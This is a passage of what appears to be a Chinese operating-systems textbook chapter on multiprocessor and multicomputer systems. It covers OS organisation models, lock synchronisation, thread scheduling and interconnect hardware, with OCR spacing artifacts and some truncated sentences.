如果每个目录项包含一个位向量 来指示哪些核包含了一个特定的缓存行，那么对于一个有着1024个核的CPU来说，目录项将至少有128 字节长。
而由于一个缓存行很少超过128字节，这就导致了目录项甚至比它追踪的缓存行还长的尴尬境 地，这显然不是我们希望看到的。
一些工程师认为，唯一已证明可适用于众核的编程模型是采用消息传递和分布式内存实现的，这也 应该是我们对于未来的众核芯片的期待。
像英特尔48核SCC这样的实验性处理器已经放弃了缓存一致性， 转而提供硬件上对于快速消息传递的支持。
另一方面，另一些处理器却仍在更大数量的核上提供缓存一 致性。
混合的模型也是可行的，比如一个1024核的芯片可以被划分为64个区域，每个区域拥有16个缓存 一致的核，但区域之间不保持一致。
操作系统自身的大部分任务运行在GPU 上还是不太可能的。
其他的计算任务正越来越多地被GPU所处理，尤其是科学计算中常见的计算型任务。
用来描述GPU 上的通用计算的术语是——正如你所猜到的——GPGPU 。
不幸的是，对GPU 进行高效的编程是十分困 难的，并且需要OpenGL 或NVIDIA的CUDA 等特殊的编程语言。
对GPU 编程和对通用处理器编程的一 个重要不同在于，GPU 的本质是单指令多数据流处理器，这意味着大量的核心在数据的不同分块上执行 完全相同的指令。
这样的一个编程模型对于数据并行来说非常棒，但是对于其他编程类型(比如任务并 行)并不是很合适。
7.异构多核
一些芯片会把一个GPU和一些通用处理器核封装在一起，许多片上系统在通用处理器核之外还包括 一个或多个特殊用途的处理器。
在一块芯片上封装了不同类型的处理器的系统被统称为异构多核处理器， 一个例子就是IXP网络处理器系列，它最初由英特尔在2000年引入，之后周期性地使用一些最新的技术 来更新维护。
典型的网络处理器包含一个通用控制核(比如运行Linux的ARM处理器)和几十上百个高 度专门化的流处理器，这些流处理器十分擅长处理网络数据包，但是其他的任务则不在行。
它们一般被 用在诸如路由器、防火墙这类网络设备上。
路由网络数据包并不太需要浮点操作，所以大多数版本的流 处理器都不包含浮点单元。
另一方面，高速网络十分依赖对内存的快速访问(为了读取数据包),所以 流处理器采用了特殊的硬件来实现这一点。
上述示例中的系统很明显都是异构的。
IXP 中的流处理器和控制处理器是截然不同的，它们采用了 不同的指令集体系结构，对于GPU 和通用核心来说也是这样。
然而在保持相同指令集体系结构的同时引 入异构多核也是可能的，比如一个CPU 可以包含一些有着较深流水线和更高的时钟频率的“大”核，以 及一些更简单、不那么强大、也许运行在更低频率的“小”核。
那些强大的核心会在运行有快速串行处 理需要的代码时派上用场，而那些小核则对于可以高效并行执行的任务很实用。
这种异构架构的一个例 子就是ARM的big.LITTLE 处理器系列。
8.在多核上编程
8.1.2 多处理机操作系统类型
让我们从对多处理机硬件的讨论转到多处理机软件，特别是多处理机操作系统上来。
这里有各种可 能的方法。
接下来将讨论其中的三种。
需要强调的是所有这些方法除了适用于多核系统之外，同样适用 于包含多个分离CPU的系统。
1. 每个CPU有自己的操作系统
组织一个多处理机操作系统的可能的最简单的方法是，静态地把存储器划分成和CPU一样多的各个 部分，为每个CPU提供其私有存储器以及操作系统的各自私有副本。
实际上n个CPU以n个独立计算机的 形式运行。
这样做一个明显的优点是，允许所有的CPU 共享操作系统的代码，而且只需要提供数据的私 有副本，如图8-7所示。
这一机制比有n个分离的计算机要好，因为它允许所有的机器共享一套磁盘及其他的I/O设备，它还允 许灵活地共享存储器。
例如，即便使用静态内存分配，一个CPU也可以获得极大的一块内存，从而高效地 执行代码。
另外，由于生产者能够直接把数据写入存储器，从而使得消费者从生产者写入的位置取出数据， 因此进程之间可以高效地通信。
况且，从操作系统的角度看，每个CPU都有自己的操作系统非常自然。
存储器
1 2
数 据 数据
3 4
数 据 数 据
操作系统代码
总线
图8-7 在4个CPU中划分多处理机存储器，但共享一个操作系统代码的副本。
标有“数据”字样的方框是 每个CPU 的操作系统私有数据
值得一提的是，该设计有四个潜在的问题。
首先，在一个进程进行系统调用时，该系统调用是在本 机的CPU上被捕获并处理的，并使用操作系统表中的数据结构。
其次，因为每个操作系统都有自己的表，那么它也有自己的进程集合，通过自身调度这些进程。
这 里没有进程共享。
如果一个用户登录到CPU 1,那么他的所有进程都在CPU 1上运行。
因此，在CPU 2有 负载运行而CPU 1空载的情形是会发生的。
第三，没有共享物理页面。
会出现如下的情形：在CPU2不断地进行页面调度时CPU 1却有多余的 页面。
由于内存分配是固定的，所以CPU 2无法向CPU1 借用页面。
第四，也是最坏的情形，如果操作系统维护近期使用过的磁盘块的缓冲区高速缓存，每个操作系统 都独自进行这种维护工作，因此，可能出现某 一 修改过的磁盘块同时存在于多个缓冲区高速缓存的情况， 这将会导致不一致性的结果。
避免这一问题的唯一途径是，取消缓冲区高速缓存。
这样做并不难，但是 会显著降低性能。
由于这些原因，上述模型实际上很少使用，尽管它在早期的多处理机中一度被采用，这是由于那时 的目标是把已有的操作系统尽可能快地移植到新的多处理机上。
一些研究工作想要重新启用该模型，但 还面临着很多问题。
在保持操作系统完全独立时有一些必须考虑的问题：如果每个处理器的所有状态都 是其本地状态，那么就几乎没有共享，也就不会出现一致性问题或锁问题。
相反，如果多个处理器需要 访问和修改同一个进程表，锁问题很快就变得复杂起来(这对性能至关重要)。
下面在介绍对称多处理 机模型时，我们会更多地讨论这个问题。
2.主从多处理机
图8-8中给出的是第二种模型。
在这种模型中，操作系统的一个副本及其数据表都在CPU 1上，而不 是在其他所有CPU上。
为了在该CPU 1上进行处理，所有的系统调用都重定向到CPU 1上。
如果有剩余 的CPU时间，还可以在 CPU 1上运行用户进程。
这种模型称为主从模型 (master-slave), 因 为CPU 1是 主CPU, 而其他的都是从属CPU。
图8-8 主从多处理机模型
主从模型解决了在第一种模型中的多数问题。
有单一的数据结构(如一个链表或者一组优先级链表) 用来记录就绪进程。
当某个CPU空闲下来时，它向CPU 1上的操作系统请求一个进程运行，并被分配一 个进程。
这样，就不会出现 一 个CPU 空闲而另 一 个过载的情形。
类似地，可在所有的进程中动态地分配
页面，而且只有一个缓冲区高速缓存，所以决不会出现不一致的情形。
这个模型的问题是，如果有很多的CPU, 主CPU 会变成一个瓶颈。
毕竟，它要处理来自所有CPU的 系统调用。
如果全部时间的10%用来处理系统调用，那么10个CPU就会使主CPU饱和，而20个CPU就会使 主CPU彻底过载。
可见，这个模型虽然简单，而且对小型多处理机是可行的，但不能用于大型多处理机。
3.对称多处理机
我们的第三种模型，即对称多处理机 (Symmetric MultiProcessor,SMP),消除了上述的不对称性。
在存储器中有操作系统的一个副本，但任何CPU 都可以运行它。
在有系统调用时，进行系统调用的CPU 陷入内核并处理系统调用。
图8-9是对SMP 模式的说明。
图8-9 SMP 多处理机模型
这个模型动态地平衡进程和存储器，因为它只有一套操作系统数据表。
它还消除了主CPU 的瓶颈， 因为不存在主CPU; 但是这个模型也带来了自身的问题。
特别是，当两个或更多的CPU同时运行操作系 统代码时，就会出现灾难。
想象有两个CPU同时选择相同的进程运行或请求同一个空闲存储器页面。
处 理这些问题的最简单方法是在操作系统中使用互斥信号量(锁),使整个系统成为一个大临界区。
当一 个CPU要运行操作系统时，它必须首先获得互斥信号量。
如果互斥信号量被锁住，就得等待。
按照这种 方式，任何CPU都可以运行操作系统，但在任一时刻只有一个CPU可运行操作系统。
这一方法称为大内 核锁 (Big Kernel Lock,BLK)。
这个模型是可以工作的，但是它几乎同主从模式一样糟糕。
同样假设，如果所有时间的10%花费在 操作系统内部。
那么在有20个CPU 时，会出现等待进入的CPU 长队。
幸运的是，这个模型比较容易改进。
操作系统中的很多部分是彼此独立的。
例如，在一个CPU 运行调度程序时，另一个CPU 则处理文件系统 的调用，而第三个在处理一个缺页异常，这种运行方式是没有问题的。
由于这一事实，可以把操作系统分割成互不影响的临界区。
每个临界区由其互斥信号量保护，所以 一次只有一个CPU 可执行它。
采用这种方式，可以实现更多的并行操作。
而某些表格，如进程表，可能 恰巧被多个临界区使用。
例如，在调度时需要进程表，在系统fork 调用和信号处理时也都需要进程表。
多临界区使用的每个表格，都需要有各自的互斥信号量。
通过这种方式，可以做到每个临界区在任一个 时刻只被一个CPU 执行，而且在任一个时刻每个临界表(critical table) 也只被一个CPU 访问。
更进一步，必须格外小心地避免死锁。
如果两个临界区都需要表A和表B, 其中一个首先申请A, 另 一个首先申请B, 那么迟早会发生死锁，而且没有人知道为什么会发生死锁。
理论上，所有的表可以被 赋予整数值，而且所有的临界区都应该以升序的方式获得表。
这一策略避免了死锁，但是需要程序员非 常仔细地考虑每个临界区需要哪个表，以便按照正确的次序安排请求。
由于代码是随着时间演化的，所以也许有个临界区需要一张过去不需要的新表。
如果程序员是新接 手工作的，他不了解系统的整个逻辑，那么可能只是在他需要的时候获得表，并且在不需要时释放掉。
尽管这看起来是合理的，但是可能会导致死锁，即用户会觉察到系统被凝固住了。
要做正确并不容易， 而且要在程序员不断更换的数年时间之内始终保持正确性太困难了。
8.1.3 多处理机同步
在多处理机中CPU经常需要同步。
这里刚刚看到了内核临界区和表被互斥信号量保护的情形。
现在 让我们仔细看看在多处理机中这种同步是如何工作的。
正如我们将看到的，它远不是那么无足轻重。
开始讨论之前，还需要引入同步原语。
如果一个进程在单处理机(仅含一个CPU) 中需要访问一些 内核临界表的系统调用，那么内核代码在接触该表之前可以先禁止中断。
然后它继续工作，在相关工作 完成之前，不会有任何其他的进程溜进来访问该表。
在多处理机中，禁止中断的操作只影响到完成禁止 中断操作的这个CPU, 其他的CPU 继续运行并且可以访问临界表。
因此，必须采用一种合适的互斥信号 量协议，而且所有的CPU都遵守该协议以保证互斥工作的进行。
任何实用的互斥信号量协议的核心都是一条特殊指令，该指令允许检测一个存储器字并以一种不可 见的操作设置。
我们来看看在图2-22中使用的指令TSL(Test and Set Lock)是如何实现临界区的。
正如 我们先前讨论的，这条指令做的是，读出一个存储器字并把它存储在一个寄存器中。
同时，它对该存储 器字写入一个1(或某些非零值)。
当然，这需要两个总线周期来完成存储器的读写。
在单处理机中，只 要该指令不被中途中断，TSL 指令就始终照常工作。
现在考虑在一个多处理机中发生 的情况。
在图8-10中我们看到了最坏 情况的时序，其中存储器字1000,被 用作一个初始化为0的锁。
第1步， CPU 1读出该字得到一个0。
第2步， 在CPU 1有机会把该字写为1之前， CPU 2进入，并且也读出该字为0。
第 3 步 ，CPU 1把1写入该字。
第4步， CPU 2也把1写入该字。
两个CPU都由 TSL 指令得到0,所以两者都对临界 区进行访问，并且互斥失败。
图8-10 如果不能锁住总线，TSL 指令会失效。
这里的四步解释了 失效情况
乍一看，高速缓存的实现也许能够消除总线竞争的问题，但事实并非如此。
理论上，只要提出请求 的CPU已经读取了锁字(lock word),它就可在其高速缓存中得到一个副本。
只要没有其他CPU试图使 用该锁，提出请求的CPU就能够用完其高速缓存。
当拥有锁的CPU 写入一个0高速缓存并释放它时，高 速缓存协议会自动地将它在远程高速缓存中的所有副本失效，要求再次读取正确的值。
问题是，高速缓存操作是在32或64字节的块中进行的。
通常，拥有锁的CPU也需要这个锁周围的字。
由于TSL 指令是一个写指令(因为它修改了锁),所以它需要互斥地访问含有锁的高速缓存块。
这样， 每一个TSL 都使锁持有者的高速缓存中的块失效，并且为请求的CPU 取一个私有的、唯一的副本。
只要 锁拥有者访问到该锁的邻接字，该高速缓存块就被送进其机器。
这样一来，整个包含锁的高速缓存块就 会不断地在锁的拥有者和锁的请求者之间来回穿梭，导致了比单个读取一个锁字更大的总线流量。
如果能消除在请求一侧的所有由TSL 引起的写操作，就可以明显地减少这种开销。
使提出请求的 CPU 首先进行一个纯读操作来观察锁是否空闲，就可以实现这个目标。
只有在锁看来是空闲时，TSL 才 真正去获取它。
这种小小变化的结果是，大多数的行为变成读而不是写。
如果拥有锁的CPU只是在同一 个高速缓存块中读取各种变量，那么它们每个都可以以共享只读方式拥有一个高速缓存块的副本，这就 消除了所有的高速缓存块传送。
当锁最终被释放时，锁的所有者进行写操作，这需要排他访问，也就使 远程高速缓存中的所有其他副本失效。
在提出请求的CPU的下一个读请求中，高速缓存块会被重新装载。
注意，如果两个或更多的CPU竞争同一个锁，那么有可能出现这样的情况，两者同时看到锁是空闲的， 于是同时用TSL 指令去获得它。
只有其中的一个会成功，所以这里没有竞争条件，因为真正的获取是由 TSL 指令进行的，而且这条指令是原子性的。
即使看到了锁空闲，然后立即用TSL指令试图获得它，也 不能保证真正得到它。
其他CPU可能会取胜，不过对于该算法的正确性来说，谁得到了锁并不重要。
纯 读出操作的成功只是意味着这可能是一个获得锁的好时机，但并不能确保能成功地得到锁。
一个更好的想法是，让每个打算获 得互斥信号量的CPU 都拥有各自用于测 试 的 私 有 锁 变 量 ， 如 图 8 - 1 1 所 示 (Mellor-Crummey 和Scott,1991)。
有 关 的变量应该存放在未使用的高速缓存块中 以避免冲突。
对这种算法的描述如下：给 一个未能获得锁的CPU分配一个锁变量并 且把它附在等待该锁的CPU 链表的末端。
在当前锁的持有者退出临界区时，它释放 链表中的首个CPU 正在测试的私有锁(在 自己的高速缓存中)。
然后该CPU 进入临 界区。
操作完成之后，该CPU释放锁。
其
图8-11 使用多个锁以防止高速缓存颠簸
后继者接着使用，以此类推。
尽管这个协
自旋与切换
假设自旋和进行线程切换都是可行的选择，则可进行如下的权衡。
自旋直接浪费了CPU 周期。
重复 地测试锁并不是高效的工作。
不过，切换也浪费了CPU 周期，因为必须保存当前线程的状态，必须获得
保护就绪链表的锁，还必须选择一个线程，必须装入其状态，并且使其开始运行。
更进一步来说，该 CPU高速缓存还将包含所有不合适的高速缓存块，因此在线程开始运行的时候会发生很多代价昂贵的高 速缓存未命中。
TLB 的失效也是可能的。
最后，会发生返回至原来线程的切换，随之而来的是更多的高 速缓存未命中。
花费在这两个线程间来回切换和所有高速缓存未命中的周期时间都浪费了。
如果预先知道互斥信号量通常被持有的时间，比如是50 μs, 而从当前线程切换需要1ms, 稍后切换 返回还需1ms, 那么在互斥信号量上自旋则更为有效。
另一方面，如果互斥信号量的平均保持时间是 10ms, 那就值得忍受线程切换的麻烦。
问题在于，临界区在这个期间会发生相当大的变化，所以，哪一 种方法更好些呢?
有一种设计是总是进行自旋。
第二种设计方案则总是进行切换。
而第三种设计方案是每当遇到一个 锁住的互斥信号量时，就单独做出决定。
在必须做出决定的时刻，并不知道自旋和切换哪一种方案更好， 但是对于任何给定的系统，有可能对其所有的有关活动进行跟踪，并且随后进行离线分析。
然后就可以 确定哪个决定最好及在最好情形下所浪费的时间。
这种事后算法 (hindsight algorithm) 成为对可行算法 进行测量的基准评测标准。
已有研究人员对上述这一问题进行了很长时间的研究(Ousterhout,1982) 。
多数的研究工作使用了 这样一个模型：一个未能获得互斥信号量的线程自旋一段时间。
如果时间超过某个阈值，则进行切换。
在某些情形下，该阈值是一个定值，典型值是切换至另一个线程再切换回来的开销。
在另一些情形下， 该阈值是动态变化的，它取决于所观察到的等待互斥信号量的历史信息。
在系统跟踪若干最新的自旋时间并且假定当前的情形可能会同先前的情形类似时，就可以得到最好 的结果。
例如，假定还是1ms切换时间，线程自旋时间最长为2ms, 但是要观察实际上自旋了多长时间。
如果线程未能获取锁，并且发现在之前的三轮中，平均等待时间为200 μs, 那么,在切换之前就应该先 自旋2ms。
但是，如果发现在先前的每次尝试中，线程都自旋了整整2ms, 则应该立即切换而不再自旋。
一些现代的处理器(包括x86) 提供特殊的指令使等待过程更高效，以降低功耗。
例如，x86 上的 MONITOR /MWAIT指令允许程序阻塞，直到某个其他处理器修改先前定义的存储器区域中的数据。
具 体来说，MONITOR 指令定义了应该对写入操作进行监视的地址范围。
然后，MWAIT指令会阻塞线程直 到有人写入该区域。
阻塞时，线程会进行自旋，但不会浪费太多时钟周期。
8.1.4 多处理机调度
线程是内核线程还是用户线程至关重要。
如果线程是由用户空间库维护的，而对内核不可见，那么 调度一如既往的基于单个进程。
如果内核并不知道线程的存在，它就不能调度线程。
对内核线程来说，情况有所不同。
在这种情况下所有线程均是内核可见的，内核可以选择一个进程 的任一线程。
在这样的系统中，发展趋势是内核选择线程作为调度单位，线程从属的那个进程对于调度 算法只有很少的(乃至没有)影响。
下面我们将探讨线程调度，当然，对于一个单线程进程 (single- threaded process) 系统或者用户空间线程，调度单位依然是进程。
后一种情形通常出现在程序开发环境中。
大型系统中通常有一些供实际代码使用的包含宏、类型定 义以及变量声明等内容的头文件。
当一个头文件改变时，所有包含它的代码文件必须被重新编译。
通常 make 程序用于管理开发工作。
调用make 程序时，在考虑了头文件或代码文件的修改之后，它仅编译那
些必须重新编译的代码文件。
仍然有效的目标文件不再重新生成。
make的原始版本是顺序工作的，不过为多处理机设计的新版本可以一次启动所有的编译。
如果需 要10个编译，那么迅速对9个进行调度而让最后一个在很长的时间之后才进行的做法没有多大意义，因 为直到最后一个线程完成之后用户才感觉到所有工作完成了。
在这种情况下，将进行编译的线程看作一 组，并在对其调度时考虑到这一点是有意义的。
从生产者一消费者的角度看，有时将大量通信的进程调度到相同时间和相近空间是非常有用的。
例 如，它们可能受益于共享缓存。
同样，在NUMA架构中，如果访问靠近的内存，可能会有益处。
1.分时
让我们首先讨论调度独立线程的情况。
稍后，我们将考虑如何调度相关联的多个线程。
处理独立线 程的最简单算法是，为就绪线程维护一个系统级的数据结构，它可能只是一个链表，但更多的情况下可 能是对应不同优先级一个链表集合，如图8-12a所示。
这里16个CPU 正在忙碌，有不同优先级的14个线 程在等待运行。
第一个将要完成其当前工作(或其线程将被阻塞)的CPU是CPU 4,然后CPU 4锁住调 度队列(scheduling queue) 并选择优先级最高的线程A, 如图8-12b所示。
接着，CPU 12 空闲并选择线 程B, 参见图8-12c。
只要线程完全无关，以这种方式调度是明智的选择并且其很容易高效地实现。
优先级
c)
图8-12 使用单一数据结构调度一个多处理机
在线程的时间片用完时，也可能发生上下文切换。
在多处理机中它有一些在单处理机中不存在的属 性。
假设某个线程在其时间片用完时恰好持有一把自旋锁，在该线程被再次调度并且释放该锁之前，其 他等待该自旋锁的CPU只是把时间浪费在自旋上。
在单处理机中，极少采用自旋锁，因此，如果持有互 斥信号量的一个线程被挂起，而另一个线程启动并试图获取该互斥信号量，则该线程会立即被阻塞，这 样只浪费了少量时间。
为了避免这种异常情况，一些系统采用智能调度(smart scheduling) 的方法，其中，获得了自旋锁 的线程设置一个进程范围内的标志以表示它目前拥有了一个自旋锁 (Zahorjan 等人，1991)。
当它释放 该自旋锁时，就清除这个标志。
这样调度程序就不会停止持有自旋锁的线程，相反，调度程序会给予稍 微多一些的时间让该线程完成临界区内的工作并释放自旋锁。
调度中的另一个主要问题是，当所有CPU 平等时，某些CPU 更平等。
特别是，当线程A 已经在CPU k上运行了很长一段时间时，CPU k的高速缓存装满了A的块。
若A很快重新开始运行，那么如果它在 CPU k上运行性能可能会更好一些，因为k的高速缓存也许还存有A的一些块。
预装高速缓存块将提高高
速缓存的命中率，从而提高了线程的速度。
另外，TLB 也可能含有正确的页面，从而减少了TLB 失效。
有些多处理机考虑了这一因素，并使用了所谓亲和调度 (affinity scheduling)(Vaswani和Zahorjan, 1991)。
其基本思想是，尽量使一个线程在它前一次运行过的同一个CPU 上运行。
创建这种亲和力 (affinity) 的一种途径是采用一种两级调度算法 (two-level scheduling algorithm)。
在一个线程创建时， 它被分给一个CPU, 例如，可以基于哪一个CPU 在此刻有最小的负载。
这种把线程分给CPU的工作在算 法的顶层进行，其结果是每个CPU 获得了自己的线程集。
线程的实际调度工作在算法的底层进行。
它由每个CPU 使用优先级或其他的手段分别进行。
通过试 图让一个线程在其生命周期内在同一个CPU 上运行的方法，高速缓存的亲和力得到了最大化。
不过，如 果某一个CPU 没有线程运行，它便选取另一个CPU的一个线程来运行而不是空转。
两级调度算法有三个优点。
第一，它把负载大致平均地分配在可用的CPU 上；第二，它尽可能发挥 了高速缓存亲和力的优势；第三，通过为每个CPU 提供一个私有的就绪线程链表，使得对就绪线程链表 的竞争减到了最小，因为试图使用另一个CPU的就绪线程链表的机会相对较小。
2. 空间共享
当线程之间以某种方式彼此相关时，可以使用其他多处理机调度方法。
前面我们叙述过的并行 make就是一个例子。
经常还有一个线程创建多个共同工作的线程的情况发生。
例如当一个进程的多个线 程间频繁地进行通信，让其在同一时间执行就显得尤为重要。
在多个CPU 上同时调度多个线程称为空间 共享 (space sharing)。
最简单的空间共享算法是这样工作的。
假设一组相关的线程是一次性创建的。
在其创建的时刻，调 度程序检查是否有同线程数量一样多的空闲CPU 存在。
如果有，每个线程获得各自专用的CPU (非多道 程序处理)并且都开始运行。
如果没有足够的CPU, 就没有线程开始运行，直到有足够的CPU时为止。
每个线程保持其CPU 直到它终止，并且该CPU 被送回可用CPU 池中。
如果一个线程在I/O 上阻塞，它继续 保持其CPU, 而 该CPU 就空闲直到该线程被唤醒。
在下一批线程出现时，应用同样的算法。
在任何一个时刻，全部CPU被静态地划分成若干个分区，每个分区都运行一个进程中的线程。
例如，
在图8-13中，分区的大小是4、6、8和12个 CPU, 有两个CPU 没有分配。
随着时间的流 逝，新的线程创建，旧的线程终止， CPU 分 区大小和数量都会发生变化。
每隔一定的周期，系统就必须做出调 度决策。
在单处理机系统中，最短作业优先 是批处理调度中知名的算法。
在多处理机系 统中类似的算法是，选择需要最少的CPU 周 期数的线程，也就是其CPU 周期数×运行时
图8-13 一个32个CPU的集合被分成4个分区，两个CPU可用
3. 群调度 (Gang Scheduling)
空间共享的一个明显优点是消除了多道程序设计，从而消除了上下文切换的开销。
但是， 一个同样
明显的缺点是当CPU被阻塞或根本无事可做时时间被浪费了，只有等到其再次就绪。
于是，人们寻找既 可以调度时间又可以调度空间的算法，特别是对于要创建多个线程而这些线程通常需要彼此通信的线程。
为了考察一个进程的多个线程被独立调度时会出现的问题，设想一个系统中有线程A₀和A₁属于进程 A, 而线程B₀和B₁属于进程B。
线 程A₀和B。
在CPU 0上分时；而线程A₁和B,在CPU 1上分时。
线程A₀和A 需要经常通信。
其通信模式是，A。
送给A₁一个消息，然后A₁回送给A₀ 一个应答，紧跟的是另一个这样的 序列。
假设正好是A₀ 和B₁ 首先开始，如图8- 14所示。
图8-14 进程A中两个交替运行的线程间的通信
在时间片0,A₀ 发给A₁一个请求，但是直到A₁在开始于100ms的时间片1中开始运行时它才得到该消 息。
它立即发送一个应答，但是直到A。
在200ms再次运行时它才得到该应答。
最终结果是每200ms一个 请求-应答序列。
这个性能并不高。
这一问题的解决方案是群调度 (gang scheduling ), 它是协同调度 (co-scheduling;Outsterhout,
1982)的发展产物。
群调度由三个部分组成：
1)把一组相关线程作为一个单位，即一个群 (gang), 一 起调度。
2)一个群中的所有成员在不同的分时CPU上同时运行。
3)群中的所有成员共同开始和结束其时间片。
使群调度正确工作的关键是，同步调度所有的CPU 。
这意味着把时间划分为离散的时间片，如图8-14 中所示。
在每一个新的时间片开始时，所有的CPU都重新调度，在每个CPU上都开始一个新的线程。
在 后续的时间片开始时，另一个调度事件发生。
在这之间，没有调度行为。
如果某个线程被阻塞，它的
CPU 保持空闲，直到对应的时间片结束为止。
有关群调度是如何工作的例子在图8-15中给 出。
图8-15中有一台带6个CPU 的多处理机，由5个 进程A到E使用，总共有24个就绪线程。
在时间槽 (time slot)0, 线 程A₀ 至A₆ 被调度运行。
在时间槽 1 , 调 度 线 程B₀ 、B₁ 、B₂ 、Co 、C₁ 和C₂ 被调度运行。
在时间槽2,进程D的5个线程以及E₀运行。
剩下的 6个线程属于E, 在时间槽3中运行。
然后周期重复 进行，时间槽4与时间槽0一样，以此类推。
群调度的思想是，让一个进程的所有线程在 不同的CPU 上同时运行，这样，如果其中一个线
CPU
0 1 2 3 4 5
图8-15 群调度
程向另一个线程发送请求，接受方几乎会立即得到消息，并且几乎能够立即应答。
在图8-15中，由于进 程的所有线程在同一个时间片内一起运行，它们可以在一个时间片内发送和接受大量的消息，从而消除 了图8- 14中的问题。
8.2 多计算机
多处理机流行和有吸引力的原因是，它们提供了一个简单的通信模型：所有CPU 共享一个公用存储 器。
进程可以向存储器写消息，然后被其他进程读取。
可以使用互斥信号量、信号量、管程 (monitor) 和其他适合的技术实现同步。
唯一美中不足的是，大型多处理机构造困难，因而造价高昂。
规模更大的
多处理机无论花费多少造价也不可能完成。
所以，如果要将CPU数量进一步扩大，还需要其他办法。
多计算机容易构造，因为其基本部件只是一台配有高性能网络接口卡的PC 裸机，没有键盘、鼠标或 显示器。
当然，获得高性能的秘密是巧妙地设计互连网络以及接口卡。
这个问题与在一台多处理机中构 造共享存储器是完全类似的(如图8-16所示)。
但是，由于目标是在微秒(microsecond) 数量级上发送消 息，而不是在纳秒(nanosecond) 数量级上访问存储器，所以这是一个相对简单、便宜且容易实现的任务。
a) b) c)
d) e) f)
图8-16 各种互连拓扑结构：a) 单交换机；b) 环 ；c) 网 格 ；d) 双凸面；e) 立方体；f 四维超立方体
在下面几节中，我们将首先简要地介绍多计算机硬件，特别是互连硬件。
然后，我们将讨论软件， 从低层通信软件开始，接着是高层通信软件。
我们还将讨论在没有共享存储器的系统中实现共享存储器 的方法。
最后，我们将讨论调度和负载平衡的问题。
8.2.1 多计算机硬件
一个多计算机系统的基本节点包括一个CPU 、存储器、 一个网络接口，有时还有一个硬盘。
节点可 以封装在标准的PC机箱中，不过通常没有图像适配卡、显示器、键盘和鼠标等。
有时这种配置被称为无 主工作站，因为没有用户。
有用户的工作站逻辑上应该对应地被叫作有主工作站，但实际上并没有这么 叫。
在某些情况下，PC 机中有一块2通道或4通道的多处理机主板，可能带有双核、四核或者八核芯片 而不是单个CPU, 不过为了简化问题，我们假设每个节点只有一个CPU。
通常成百个甚至上千个节点连 接在一起组成一个多计算机系统。
下面我们将介绍多计算机系统是如何组织的。
1.互连技术
在每个节点上有一块网卡，带有一根或两根从网卡上接出的电缆(或光纤)。
这些电缆或者连到其 他的节点上，或者连到交换机上。
在小型系统中，可能会有一个按照图8-16a的星形拓扑结构连接所有 节点的交换机。
现代交换型以太网就采用了这种拓扑结构。
作为单一交换机设计的另一种选择，节点可以组成一个环，有两根线从网络接口卡上出来， 一根去 连接左面的节点，另一根去连接右面的节点，如图8-16b所示。
在这种拓扑结构中不需要交换机，所以 图中也没有。
图8-16c中 的网 格 (grid 或mesh) 是一种在许多商业系统中应用的二维设计。
它相当规整，而且容 易扩展为大规模系统。
这种系统有一个直 径 (diameter), 即在任意两个节点之间的最长路径，并且该值
在多计算机中可采用两种交换机制。
在第一种机制里，每个消息首先被分解(由用户软件或网络接 口进行)成为有最大长度限制的块，称为包 (packet) 。
该交换机制称为存储转发包交换(store-and-
forward packet switching),由源节点的网络接口卡注入第一个交换机的包组成，如图8-17a所示。
比特 串一次进来一位，当整个包到达一个输入缓冲区时，它被复制到沿着其路径通向下一个交换机的队列当 中，如图8-17b所示。
当数据包到达目标节点所连接的交换机时，如图8-17c所示，该数据包被复制到目 标节点的网络接口卡，并最终到达其RAM。
整个包 整个包
a) b) c)
图8-17 存储转发包交换
另一种交换机制是电路交换 (circuit switching),它包括由第一个交换机建立的，通过所有交换机 而到达目标交换机的一条路径。
一旦该路径建立起来，比特流就从源到目的地通过整个路径不断地尽快 输送。
在所涉及的交换机中，没有中间缓冲。
电路交换需要有一个建立阶段，它需要一点时间，但是一 旦建立完成，速度就很快。
在包发送完毕之后，该路径必须被拆除。
电路交换的一种变种称为虫孔路由 (wormhole routing),它把每个包拆成子包，并允许第一个子包在整个路径还没有完全建立之前就开始 流动。
2. 网络接口
在多计算机中，所有节点里都有一块插卡板，它包含节点与互连网络的连接，这使得多计算机连成 一体。
这些板的构造方式以及它们如何同主CPU 和RAM连接对操作系统有重要影响。
这里简要地介绍一 些有关的内容。
部分内容来源于(Bhoedjang,2000)。
事实上在所有的多计算机中，接口板上都有一些用来存储进出包的RAM 。
通常，在包被传送到第 一个交换机之前，这个要送出的包必须被复制到接口板的RAM 中。
这样设计的原因是许多互连网络是 同步的，所以一旦一个包的传送开始，比特流必须以恒定的速率连续进行。
如果包在主RAM 中，由于 内存总线上有其他的信息流，所以这个送到网络上的连续流是不能保证的。
在接口板上使用专门的 RAM, 就消除了这个问题。
这种设计如图8-18所示。
图8-18 网络接口卡在多计算机中的位置
同样的问题还出现在接收进来的包上。
从网络上到达的比特流速率是恒定的，并且经常有非常高的 速率。
如果网络接口卡不能在它们到达的时候实时存储它们，数据将会丢失。
同样，在这里试图通过系 统总线(例如PCI总线)到达主RAM 是非常危险的。
由于网卡通常插在PCI 总线上，这是一个唯一的通 向主RAM的连接，所以不可避免地要同磁盘以及每个其他的I/O 设备竞争总线。
而把进来的包首先保存 在接口板的私有RAM中，然后再把它们复制到主RAM中，则更安全些。
接口板上可以有一个或多个DMA 通道，甚至在板上有一个完整的CPU (乃至多个CPU)。
通 过 请 求 在系统总线上的块传送 (block transfer),DMA通道可以在接口板和主RAM之间以非常高的速率复制包， 因而可以一次性传送若干字而不需要为每个字分别请求总线。
不过，准确地说，正是这种块传送(它占 用了系统总线的多个总线周期)使接口板上的RAM的需要是第一位的。
下一节将讨论尽可能减少由复制、缓存污染和上下文切换所带来开销的技术。
8.2.2 低层通信软件
在多计算机系统中高性能通信的敌人是对包的过度复制。
在最好的情形下，在源节点会有从RAM
到接口板的一次复制，从源接口板到目的接口板的一次复制(如果在路径上没有存储和转发发生)以及 从目的接口板再到目的地RAM 的一次复制，这样一共有三次复制。
但是，在许多系统中情况要糟糕得 多。
特别是，如果接口板被映射到内核虚拟地址空间中而不是用户虚拟地址空间的话，用户进程只能通 过发出一个陷入到内核的系统调用的方式来发送包。
内核会同时在输入和输出时把包复制到自己的存储 空间去，从而在传送到网络上时避免出现缺页异常 (page fault)。
同样，接收包的内核在有机会检查包 之前，可能也不知道应该把进来的包放置到哪里。
上述五个复制步骤如图8-18所示。
首先，如果在节点上有若干个进程运行而且需要访问网络以发送包，该怎么办?
哪一个进程应该在 其地址空间中获得接口板呢?
映射拥有一个系统调用将接口板映射进出一个虚拟地址空间，其代价是很 高的，但是，如果只有一个进程获得了卡，那么其他进程该如何发送包呢?
